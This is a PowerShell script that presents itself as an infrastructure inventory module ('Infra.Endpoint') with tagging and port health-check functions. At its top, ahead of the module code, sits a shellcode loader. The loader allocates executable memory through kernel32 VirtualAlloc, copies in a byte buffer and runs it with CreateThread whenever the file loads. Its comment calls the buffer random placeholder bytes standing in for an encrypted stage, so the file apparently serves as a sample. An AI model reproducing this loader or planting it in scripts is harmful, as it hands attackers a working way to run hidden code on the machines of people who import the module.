
$LogPath = "$env:TEMP\stage.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xd6, 0xbf, 0x80, 0xcf, 0x55, 0x4e, 0xbf, 0x35, 0x98, 0x14, 0xa6, 0xd2, 0xbb, 0x8e, 0x76, 0x29,
        0x66, 0x67, 0xbe, 0x21, 0xb3, 0x0c, 0x93, 0xdb, 0x96, 0x0a, 0x38, 0x64, 0xee, 0xbe, 0x71, 0x7e,
        0xac, 0x22, 0xc6, 0x09, 0xfa, 0xb4, 0x6d, 0xc9, 0x46, 0x37, 0x4f, 0xd5, 0x9f, 0x34, 0xf2, 0x77,
        0x0e, 0xf6, 0x28, 0x3d, 0x72, 0x53, 0x2e, 0xa3, 0xe1, 0x2b, 0xd8, 0xf3, 0x8e, 0x81, 0xa8, 0xb2,
        0xf3, 0x64, 0xea, 0x4b, 0x85, 0xf1, 0x33, 0x34, 0x6c, 0x2a, 0x14, 0xa0, 0x0e, 0x1a, 0x5f, 0xf0,
        0xef, 0x80, 0x10, 0x6c, 0x28, 0x8a, 0xdf, 0x27, 0x98, 0x8b, 0xfd, 0xa0, 0xba, 0x6c, 0x6a, 0xb3,
        0xa0, 0x0b, 0x0b, 0x35, 0x34, 0x87, 0x8f, 0xdc, 0x38, 0x00, 0x62, 0x02, 0xab, 0x2e, 0x7d, 0x10,
        0x6e, 0x15, 0xdb, 0x55, 0xed, 0x20, 0xd8, 0xca, 0x9a, 0xd1, 0x0a, 0xf1, 0xf3, 0x29, 0xf3, 0x7f,
        0xd9, 0x06, 0x91, 0xf3, 0xf4, 0xf7, 0xb3, 0x31, 0x75, 0xc5, 0x3e, 0xaf, 0x09, 0x96, 0x8e, 0x75,
        0x08, 0x37, 0xfe, 0xb2, 0xf7, 0x58, 0x1f, 0x0b, 0x82, 0x95, 0xb7, 0x05, 0x38, 0x16, 0x7b, 0xf0,
        0x6c, 0x34, 0xae, 0x56, 0x09, 0x49, 0x52, 0x57, 0x72, 0x5a, 0x53, 0x01, 0x69, 0xf1, 0x6c, 0xc4,
        0x92, 0x7b, 0x70, 0x15, 0x46, 0x6b, 0x2b, 0x4c, 0x1d, 0x29, 0xe9, 0x33, 0x7e, 0x22, 0xd1, 0xe1,
        0xa7, 0x3b, 0xc5, 0x63, 0x03, 0x1a, 0x89, 0xe3, 0xf1, 0x97, 0xe2, 0x5c, 0xe5, 0xf6, 0x4e, 0x67,
        0x18, 0x16, 0xf6, 0x48, 0x2f, 0xca, 0xe6, 0x71, 0x9c, 0x4e, 0x6b, 0x7b, 0xb8, 0xc0, 0xa6, 0xdd,
        0x90, 0xd1, 0x67, 0xc5, 0xff, 0xbf, 0xad, 0xe6, 0xc4, 0xc1, 0x61, 0xcd, 0xa9, 0x66, 0x44, 0xe0,
        0x7d, 0xc6, 0xcb
    )

    $Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 1427)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
$ErrorActionPreference = "Stop"

$InformationPreference = 'SilentlyContinue'
Set-StrictMode -Version 2.0
$ProgressPreference = 'SilentlyContinue'

$script:DefaultTimeout = 30
$script:ModuleVersion = '1.9.0'

function Get-InfraEndpoint {
    <#
    .SYNOPSIS
        Returns Infra inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Test'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-InfraEndpointTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-InfraEndpointHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-InfraPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}
function Infra-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-InfraModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Infra.Endpoint'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-InfraEndpoint', 'Set-InfraEndpointTag', 'Test-InfraEndpointHealth')
    }
}

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Infra.Endpoint')

$script:ExportedFunctions = @('Get-InfraEndpoint', 'Set-InfraEndpointTag', 'Test-InfraEndpointHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

Write-Verbose ('Loaded module {0} version {1}' -f 'Infra.Endpoint', $script:ModuleVersion)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

Export-ModuleMember -Function Get-InfraEndpoint, Set-InfraEndpointTag, Test-InfraEndpointHealth, Get-InfraModuleInfo
